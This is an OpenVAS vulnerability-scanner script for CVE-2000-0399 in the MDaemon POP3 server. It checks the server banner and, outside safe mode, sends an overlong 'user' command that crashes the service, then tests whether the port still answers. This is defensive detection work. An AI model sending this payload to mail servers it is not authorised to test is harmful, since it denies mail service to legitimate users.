# OpenVAS Vulnerability Test
# $Id: mdaemon_mail_server_dos.nasl 13293 2019-01-25 12:15:55Z cfischer $
# Description: MDaemon mail server DoS
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: Cassius <cassius@hushmail.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14825");
  script_version("$Revision: 13293 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-25 13:15:55 +0100 (Fri, 25 Jan 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1250);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2000-0399");
  script_name("MDaemon POP3 server DoS");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("popserver_detect.nasl");
  script_require_ports("Services/pop3", 110, 995);
  script_mandatory_keys("pop3/mdaemon/detected");

  script_tag(name:"solution", value:"Upgrade to the newest version of this software.");

  script_tag(name:"summary", value:"The remote host is running the MDaemon POP3 server.

  It is possible to crash the remote service by sending a too long 'user' command.");

  script_tag(name:"impact", value:"This problem allows an attacker to make the remote
  MDaemon server crash, thus preventing legitimate users from receiving e-mails.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("pop3_func.inc");

port = get_pop3_port(default:110);

if(safe_checks()) {

  banner = get_pop3_banner(port:port);
  if(!banner || "MDaemon" >!< banner)
    exit(0);

  if(ereg(pattern:".* POP3? MDaemon ([0-2]\.|0\.3\.[0-3][^0-9])", string:banner)) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

banner = recv_line(socket:soc, length:4096);
if(! banner || "MDaemon" >!< banner) {
  close(soc);
  exit(0);
}

s = string("user ", crap(256), "\r\n");
send(socket:soc, data:s);
d = recv_line(socket:soc, length:4096);
s = string("pass vt-test\r\n");
send(socket:soc, data:s);

close(soc);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port:port);
  exit(0);
}

close(soc2);
exit(99);